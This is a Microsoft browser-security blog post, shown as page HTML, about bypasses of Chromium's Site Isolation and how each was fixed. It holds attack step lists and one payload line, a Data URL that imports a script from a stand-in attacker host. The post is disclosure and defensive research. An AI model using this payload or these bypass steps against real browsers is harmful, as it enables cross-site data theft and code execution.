<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="twitter:image" content="https://microsoftedge.github.io/edgevr/assets/img/edge-logo-128x128.png"><title>Deep Dive into Site Isolation (Part 2) | Microsoft Browser Vulnerability Research</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Deep Dive into Site Isolation (Part 2)" /><meta name="author" content="Jun Kokatsu" /><meta property="og:locale" content="en_US" /><meta name="description" content="In the previous blog post, I explained how Site Isolation and related security features help mitigate attacks such as UXSS and Spectre. However, security bugs in a renderer process are really common, and therefore Chromium‚Äôs threat model assumes that a renderer process can be compromised and it can‚Äôt be trusted. To align with this threat model, Chromium announced improvements to Site Isolation in 2019 to further mitigate the amount of damage a compromised renderer process can cause. In this blog post, I will explain details of those improvements and bugs found along the way." /><meta property="og:description" content="In the previous blog post, I explained how Site Isolation and related security features help mitigate attacks such as UXSS and Spectre. However, security bugs in a renderer process are really common, and therefore Chromium‚Äôs threat model assumes that a renderer process can be compromised and it can‚Äôt be trusted. To align with this threat model, Chromium announced improvements to Site Isolation in 2019 to further mitigate the amount of damage a compromised renderer process can cause. In this blog post, I will explain details of those improvements and bugs found along the way." /><link rel="canonical" href="https://microsoftedge.github.io/edgevr/posts/deep-dive-into-site-isolation-part-2/" /><meta property="og:url" content="https://microsoftedge.github.io/edgevr/posts/deep-dive-into-site-isolation-part-2/" /><meta property="og:site_name" content="Microsoft Browser Vulnerability Research" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-12-28T09:25:00-08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Deep Dive into Site Isolation (Part 2)" /><meta name="twitter:site" content="@MSEdgeDev" /><meta name="twitter:creator" content="@Jun Kokatsu" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Jun Kokatsu"},"description":"In the previous blog post, I explained how Site Isolation and related security features help mitigate attacks such as UXSS and Spectre. However, security bugs in a renderer process are really common, and therefore Chromium‚Äôs threat model assumes that a renderer process can be compromised and it can‚Äôt be trusted. To align with this threat model, Chromium announced improvements to Site Isolation in 2019 to further mitigate the amount of damage a compromised renderer process can cause. In this blog post, I will explain details of those improvements and bugs found along the way.","url":"https://microsoftedge.github.io/edgevr/posts/deep-dive-into-site-isolation-part-2/","@type":"BlogPosting","headline":"Deep Dive into Site Isolation (Part 2)","dateModified":"2020-12-28T09:25:00-08:00","datePublished":"2020-12-28T09:25:00-08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://microsoftedge.github.io/edgevr/posts/deep-dive-into-site-isolation-part-2/"},"@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/edgevr/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/edgevr/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/edgevr/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/edgevr/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/edgevr/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/edgevr/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/edgevr/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/edgevr/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/edgevr/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/edgevr/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/edgevr/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/edgevr/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/edgevr/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/edgevr/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/edgevr/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/edgevr/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/edgevr/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/edgevr/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/edgevr/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/edgevr/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/edgevr/assets/css/post.css"><link rel="stylesheet" href="/edgevr/assets/css/post.css"><link rel="preload" as="style" href="/edgevr/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/edgevr/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <script type="text/javascript"> (function(c,l,a,r,i,t,y){ c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)}; t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i; y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y); })(window, document, "clarity", "script", "4xpt5cebre"); </script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2020 Cotes Chung MIT Licensed --> <script src="/edgevr/assets/js/post.min.js" async></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" async></script> <script src="/edgevr/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/edgevr/" alt="avatar"> <img src="/edgevr/assets/img/edge-logo-128x128.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/edgevr/">Microsoft Browser <b>Vulnerability Research</b></a></div><div class="site-subtitle font-italic">News from the lab</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/edgevr/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/edgevr/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/edgevr/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/edgevr/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper" style="margin-right: 9px;"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border" style="display:none;"></span> <a href="https://github.com/MicrosoftEdge" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="/edgevr/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/edgevr/"> Posts </a> </span> <span>Deep Dive into Site Isolation (Part 2)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Deep Dive into Site Isolation (Part 2)</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy ¬© 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Dec 28, 2020, 9:25 AM -0800" > Dec 28, 2020 <i class="unloaded">2020-12-28T09:25:00-08:00</i> </span> by <span class="author"> Jun Kokatsu <a href="https://twitter.com/shhnjk" title="Author's Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> </span></div></div><div class="post-content"><p>In the <a href="https://microsoftedge.github.io/edgevr/posts/deep-dive-into-site-isolation-part-1/">previous blog post</a>, I explained how Site Isolation and related security features help mitigate attacks such as UXSS and Spectre. However, security bugs in a renderer process are <a href="https://www.chromium.org/Home/chromium-security/site-isolation#TOC-Motivation">really common</a>, and therefore <a href="https://chromium.googlesource.com/chromium/src/+/master/docs/security/side-channel-threat-model.md#nastier-threat-models">Chromium‚Äôs threat model</a> assumes that a renderer process can be compromised and it can‚Äôt be trusted. To align with this threat model, Chromium announced <a href="https://blog.chromium.org/2019/10/recent-site-isolation-improvements.html#:~:text=Containing%20Compromised%20Renderers">improvements to Site Isolation</a> in 2019 to further mitigate the amount of damage a compromised renderer process can cause. In this blog post, I will explain details of those improvements and bugs found along the way.</p><h1 id="what-is-a-compromised-renderer-process">What is a compromised renderer process?</h1><p>Attackers may find security bugs in Chromium‚Äôs renderer process, such as in the JavaScript engine, DOM, or image parsing logic. Sometimes, these bugs may involve memory errors (e.g., a ‚Äúuse-after-free‚Äù bug) which allow an attacker‚Äôs web page to execute their own, arbitrary, native code (e.g. assembly/C++ code, as opposed to JavaScript code) in the renderer process. We call such a process a ‚Äúcompromised renderer‚Äù - by <a href="https://groups.google.com/a/chromium.org/g/chromium-extensions/c/0ei-UCHNm34/m/lDaXwQhzBAAJ#:~:text=What%20is%20a%20compromised%20renderer%20process?">≈Åukasz Anforowicz</a></p><p>This means a compromised renderer process can not only read an entire memory in the renderer process, but also write to it. Which for example, allow the attacker to fake <a href="https://en.wikipedia.org/wiki/Inter-process_communication">IPC</a> messages from the renderer process to other processes. <a href="https://chromium.googlesource.com/chromium/src/+/master/docs/security/compromised-renderers.md">This list</a> explains where those Site Isolation improvements have been added.</p><h1 id="finding-first-site-isolation-bypass-to-achieve-uxss">Finding first Site Isolation bypass to achieve UXSS</h1><p>While looking for ways to bypass Site Isolation, I remembered a really interesting <a href="https://github.com/Bo0oM/CVE-2017-5124">UXSS bug</a> found by <a href="https://twitter.com/i_bo0om">Bo0oM</a>. Site Isolation was still an experimental feature and disabled at the time, I wondered if the same bug could be used to bypass Site Isolation.</p><p>So, I enabled Site Isolation and tested the UXSS bug, and it worked in an interesting way. While the origin was changed, the process from the previous site was reused. Trying to access cookie for example, would crash the renderer process, because Site Isolation would notice that the process should not request cookie for another origin. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/edgevr/assets/img/blog_img/site_isolation/getting_cookie.PNG" /></p><p>This was a perfect bug to find a Site Isolation bypass because this behavior was similar to a compromised renderer where you can overwrite the origin information in the renderer process, but that wouldn‚Äôt allow an attacker to bypass process isolation by Site Isolation. By using this bug, we can test which API wouldn‚Äôt care about a faked origin and allow us to access other origin‚Äôs information. So, while testing it myself, I also told <a href="https://twitter.com/kinugawamasato">Masato</a> about this interesting behavior. And soon, he found a bug üòä It turns out that you can create a Blob URL with a spoofed origin and navigating to that Blob URL would allow us to access cookie of the target site.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/edgevr/assets/img/blog_img/site_isolation/blob.gif" /></p><p>While we were able to find a bug, we had to make sure that the bug still exists in the stable version because the UXSS bug had been fixed. To validate this, I just used WinDbg to change the origin before sending the IPC to make a Blob URL, and I was able to trigger the same bug on the stable version.</p><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=886976">This bug</a> was fixed by verifying the origin in the browser process when creating a Blob URL.</p><h1 id="spoofing-ipc-messages">Spoofing IPC messages</h1><p>From the previous bug, it became clear that the easiest way to test Site Isolation improvements against a compromised renderer would be to spoof IPC messages from a renderer process where it sends an origin or a URL information. But reading code to find such places and using <a href="https://chromium.googlesource.com/chromium/src/+/master/mojo/public/js/README.md">Mojo JS</a> to send fake IPC messages seemed like a lot of work üòã</p><p>So, I created a JavaScript debugger extension for WinDbg called <a href="https://github.com/shhnjk/spoof.js">spoof.js</a>. Because <em>spoof.js</em> will change the origin and the URL in a renderer‚Äôs memory, I just need to make normal Web API calls to test IPCs. This also had an unintentional advantage that it can also spoof IPC messages implemented with <a href="https://chromium.googlesource.com/chromium/src/+/refs/tags/72.0.3586.1/ipc/README.md">legacy IPC</a> instead of <a href="https://chromium.googlesource.com/chromium/src/+/master/mojo/README.md">Mojo</a> (which wouldn‚Äôt be possible if I chose to test with the Mojo JS).</p><h2 id="a-bug-in-postmessage">A bug in <em>postMessage</em></h2><p>While testing with <em>spoof.js</em>, I noticed that I could send <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage"><em>postMessage</em></a> to a cross-site window/frame with the spoofed origin, and I could also receive a message that was sent with a different target origin by spoofing the origin.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/edgevr/assets/img/blog_img/site_isolation/spoofed_message.PNG" /></p><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=915398">This bug</a> was fixed by validating the origin of <em>postMessage</em> IPC in the browser process.</p><h1 id="address-bar-spoof-with-a-compromised-renderer">Address bar spoof with a compromised renderer</h1><p>Unfortunately, I was only able to find the <em>postMessage</em> bug with <em>spoof.js</em>. The next thing I tried was to think of a place where there might be a Site Isolation bypass and do a code review + testing. And I thought I will look into navigations üòä</p><p>If you study a little bit about how <a href="https://youtu.be/OFIvyc1y1ws?t=314">navigations work</a> in Chromium, there is an interesting step where the renderer process will <em>commit</em> the navigation and send an IPC to the browser process. This IPC message is interesting, because renderer process can tell which origin and URL the renderer process had committed the navigation to <em>after</em> navigation has been started (i.e. the network process has already started downloading response). If validations in the browser process aren‚Äôt strong enough, things can go wrong üòä</p><p>While testing for handling of navigations, I noticed that if the origin is an <a href="https://html.spec.whatwg.org/multipage/origin.html#concept-origin-opaque">opaque origin</a>, I could claim that the navigation has been committed to any URL from a renderer process. <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=918565">This bug</a> existed because any URL can be an opaque origin (with iframe/CSP sandbox) and doing normal origin vs URL check doesn‚Äôt make sense. This check has been tightened to ensure that the address bar spoof isn‚Äôt possible.</p><h1 id="abusing-protocol-handler">Abusing Protocol Handler</h1><p>Another idea I had was, what if I can use <a href="https://developer.mozilla.org/en-US/docs/Web/API/Navigator/registerProtocolHandler"><em>registerProtocolHandler</em> API</a> to navigate any protocol to some bad URL (e.g. Data URL)? So, I checked their implementation, and following restrictions were bypassable/spoofable.</p><ul><li>The protocol/scheme must be in the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Navigator/registerProtocolHandler#Permitted_schemes">allow-list</a>:<ul><li>This check was implemented inside a renderer process, and browser process only had deny-list check related to browser-handled schemes (e.g. <em>http:</em>, <em>https:</em>, etc).</li></ul></li><li>Destination URL has to be same-origin to the registering window<ul><li>This check was also inside a renderer process, thus can be bypassed.</li></ul></li><li>User has to accept the permission prompt<ul><li>The origin shown in the permission prompt was calculated using destination URL, which could be anything with #2 bypass.</li><li>A cross-origin iframe can call <em>registerProtocolHandler</em> API.</li><li>The permission prompt shows no origin information if you pass a Data URL üòÇ <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/edgevr/assets/img/blog_img/site_isolation/blank_permission.png" /></li></ul></li></ul><p>With these bypasses, an attacker can bypass Site Isolation with the following steps:</p><ol><li>Request a protocol handler permission with the following Data URL as the destination URL.<ul><li><code class="language-plaintext highlighter-rouge">data:text/html,&lt;script&gt;import('https://evil.example/renderer_exploit.js')&lt;/script&gt;</code></li></ul></li><li>Clickjack a victim page which has a link to the custom protocol (e.g. <em>tel:</em>, <em>mailto:</em>, etc).</li><li>Clicking the link would navigate to the above Data URL, which would execute in the victim‚Äôs renderer process.</li></ol><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/edgevr/assets/img/blog_img/site_isolation/proto.gif" /></p><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=971917">This bug</a> was fixed by adding appropriate checks in the browser process.</p><h1 id="finding-bugs-in-reader-mode-through-a-security-review">Finding bugs in Reader mode through a security review</h1><p>When Edge started building the <a href="https://docs.microsoft.com/en-us/microsoft-edge/dev-guide/browser-features/reading-view">Reading View</a> experience, we decided to use <a href="https://chromium.googlesource.com/chromium/dom-distiller#dom-distiller">DOM Distiller</a> which powers Reader mode in Chrome. I was curious about how DOM Distiller is implemented, so I started testing it.</p><p>Reader mode sanitizes HTML content from the site before rendering for good reading experience. While they tried to remove most of the dangerous tags (e.g. <code class="language-plaintext highlighter-rouge">script</code>, <code class="language-plaintext highlighter-rouge">style</code>, etc) many event handlers weren‚Äôt properly sanitized (e.g. <code class="language-plaintext highlighter-rouge">&lt;button onclick="alert(1)"&gt;</code>). And images and videos from the site could be rendered by design.</p><p>This essentially means if an attacker has a memory corruption bug in image or video parsing, or a CSP bypass, an attacker can compromise a Reader mode process or execute a script in the Reader mode.</p><p>Reader mode is rendered with <code class="language-plaintext highlighter-rouge">chrome-distiller:</code> scheme, where the host name is a <span style="color:DodgerBlue">GUID</span>, and the <span style="color:red"><em>url</em></span> parameter pointing to the page to be distilled.</p><p>chrome-distiller://<span style="color:DodgerBlue">9a898ff4-b0ad-45c6-8da2-bd8a6acce25d</span>/?url=<span style="color:red">https://news.example</span></p><p>And because the GUID could be reused to render other cross-site page, Reader mode can be exploited with following steps:</p><ol><li>Open new window to victim‚Äôs site (Reader mode will cache the page)</li><li>Navigate the victim window to Reader mode using same GUID</li><li>The attacker‚Äôs window and the victim‚Äôs window lives in the same process. Steal the secret ü•≥</li></ol><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/edgevr/assets/img/blog_img/site_isolation/reader mode.gif" /></p><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=991888">This bug</a> was fixed by adding the hash of the <em>url</em> parameter in the host name as well as <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1012955">improving the sanitization</a>.</p><p>Reader mode‚Äôs design was fragile because the same process could handle sensitive data from different sites and that process can be compromised. If I may steal the idea of <a href="https://chromium.googlesource.com/chromium/src/+/master/docs/security/rule-of-2.md">The Rule of 2</a>, The Rule of 2 for Site Isolation would be:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/edgevr/assets/img/blog_img/site_isolation/Rule of Two for Site Isolation.png" /></p><h1 id="site-isolation-bypasses-found-by-other-researchers">Site Isolation bypasses found by other researchers</h1><p>There are some great Site Isolation bypasses found by other researchers, which are worth mentioning.</p><h2 id="site-isolation-bypass-by-overwriting-a-host-header">Site Isolation bypass by overwriting a Host header</h2><p><a href="https://twitter.com/ifsecure">Ivan Fratric</a> found a <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=973103">bug</a> which allowed him to overwrite various request headers on redirect, including a host header. While how to exploit this bug isn‚Äôt clearly mentioned, this bug allows attaching cookies that belongs to another site in a request to the attacker‚Äôs site.</p><p>This is an interesting bug that exploits how the browser decide to attach cookies.</p><h2 id="site-isolation-bypass-and-local-file-disclosure-via-payment-handler-api">Site Isolation bypass and local file disclosure via Payment Handler API</h2><p><a href="https://bugs.chromium.org/u/glazunov@google.com/">Sergei Glazunov</a> found a <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=996741">bug</a> in <a href="https://w3c.github.io/payment-handler/">Payment Handler API</a>, where same-origin check for the <em>url</em> parameter in <a href="https://developer.mozilla.org/en-US/docs/Web/API/PaymentRequestEvent/openWindow">openWindow</a> method was only performed within the renderer process, and therefore it can be bypassed with a compromised renderer.</p><p>Sergei mentions 2 ways of exploiting this bug.</p><ol><li>Local file disclosure<ul><li>An attacker downloads an HTML file containing a renderer exploit. Then, the attacker can open the downloaded file using the <em>openWindow</em> bug. Because any <a href="https://microsoftedge.github.io/edgevr/posts/deep-dive-into-site-isolation-part-1/#file-url">File URL</a> is treated as same-site, the downloaded file can now read any local file and send that content to a remote server.</li></ul></li><li>UXSS (equivalent)<ul><li>Sergei noticed that when a JavaScript URL is opened using the <em>openWindow</em> bug, the resulting process doesn‚Äôt get a <a href="https://microsoftedge.github.io/edgevr/posts/deep-dive-into-site-isolation-part-1/#what-is-site-isolation"><em>Site</em></a> assigned. And Chrome would reuse the same process for navigation in that window. Which means an attacker can compromise a renderer process by opening JavaScript URL, and then ask Chrome to navigate to any site while attacker is in full control of that process. This is essentially a UXSS, though it‚Äôs much stronger primitive than a UXSS (because it can call native functions as opposed to JS functions).</li></ul></li></ol><h2 id="site-isolation-bypass-in-blob-url-registration">Site Isolation bypass in Blob URL registration</h2><p><a href="https://bugs.chromium.org/u/glazunov@google.com/">Sergei Glazunov</a> noticed that the security check for Blob URL registration happened with a process validity check.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>if (!delegate_-&gt;CanCommitURL(url) &amp;&amp; delegate_-&gt;IsProcessValid()) {
  // kill the rendere process.
}
</pre></table></code></div></div><p>And Sergei found out that with a compromised renderer, it‚Äôs possible to make a process invalid (i.e. make <code class="language-plaintext highlighter-rouge">IsProcessValid()</code> return <em>false</em>) while keeping the renderer process alive. Therefore, Sergei was able to bypass the security check and create a Blob URL for any site (i.e. UXSS).</p><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1035399">This bug</a> was a mind-blowing find, as one needs to deeply understand the internals of process termination as well as find the vulnerable code.</p><h1 id="abusing-extensions-to-bypass-site-isolation">Abusing Extensions to bypass Site Isolation</h1><p>After finding multiple Site Isolation bypasses, it was clear that the low hanging fruit were close to exhausted. So, I changed the way of thinking, and started to look for a process which has access to cross-site data by default, and the Extension‚Äôs process seemed promising.</p><h2 id="background-script-and-content-script">Background script and Content script</h2><p>Chrome extensions have 2 kinds of scripts.</p><ol><li>Background script (which executes in an Extension process)</li><li>Content script (which is injected to renderer processes)</li></ol><p>Background script is a privileged script which can bypass CORS as well as inject an arbitrary script to sites where the extension has access to.</p><p>And there are communication channels between Content script and Background script.</p><ul><li><code class="language-plaintext highlighter-rouge">chrome.runtime.sendMessage</code> -&gt; <code class="language-plaintext highlighter-rouge">chrome.runtime.onMessage.addListener</code></li><li><code class="language-plaintext highlighter-rouge">chrome.extension.sendMessage</code> -&gt; <code class="language-plaintext highlighter-rouge">chrome.extension.onMessage.addListener</code></li><li><code class="language-plaintext highlighter-rouge">chrome.extension.sendRequest</code> -&gt; <code class="language-plaintext highlighter-rouge">chrome.extension.onRequest.addListener</code></li><li><code class="language-plaintext highlighter-rouge">port.postMessage</code> -&gt; <code class="language-plaintext highlighter-rouge">port.onMessage.addListener</code></li><li><code class="language-plaintext highlighter-rouge">chrome.storage.local.set</code> -&gt; <code class="language-plaintext highlighter-rouge">chrome.storage.local.get</code></li><li>etc</li></ul><p>While Content scripts runs in an <a href="https://developer.chrome.com/docs/extensions/mv2/content_scripts/#isolated_world">isolated world</a>, it still runs inside a renderer process. And because many extensions inject a Content script to all websites (e.g. Password manager extensions, Ad blocking extensions, etc), a compromised renderer can send messages to a Background script using above communication channels.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/edgevr/assets/img/blog_img/site_isolation/BSCS.PNG" /></p><p>But I wasn‚Äôt sure if any extension would do something wrong with messages passed from a content script, so I started auditing extensions to see the practical exploitability of this technique.</p><h2 id="bugs-in-the-screen-reader-extension">Bugs in the Screen Reader extension</h2><p>The <a href="https://chrome.google.com/webstore/detail/screen-reader/kgejglhpjiefppelpmljglcjbhoiplfn">Screen Reader</a> extension (AKA ChromeVox) is one of the extensions developed by Chrome team. This extension is special because it‚Äôs whitelisted by Chrome to inject content scripts to pages such as New Tab Page, Devtools, Chrome 